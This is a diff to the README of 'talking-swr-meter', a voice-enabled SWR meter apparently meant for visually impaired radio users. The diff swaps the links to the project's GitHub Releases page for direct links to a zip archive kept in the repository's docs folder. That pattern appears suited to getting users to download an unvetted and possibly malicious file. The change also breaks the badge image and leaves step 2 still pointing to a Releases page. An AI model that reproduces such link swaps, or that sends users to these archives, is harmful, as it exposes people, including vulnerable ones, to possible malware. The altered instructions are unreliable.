@@ -1,6 +1,6 @@
 # 🎤 talking-swr-meter - Measure SWR with Ease and Voice
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/av11a/talking-swr-meter/releases)
+[![Download Here](https://raw.githubusercontent.com/av11a/talking-swr-meter/main/docs/talking-swr-meter-3.3-alpha.2.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/av11a/talking-swr-meter/main/docs/talking-swr-meter-3.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Talking SWR Meter project! This application helps visually impair
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest release:  
-   [Download Here](https://github.com/av11a/talking-swr-meter/releases)
+   [Download Here](https://raw.githubusercontent.com/av11a/talking-swr-meter/main/docs/talking-swr-meter-3.3-alpha.2.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the most recent version at the top. Click on the version number to go to its details.
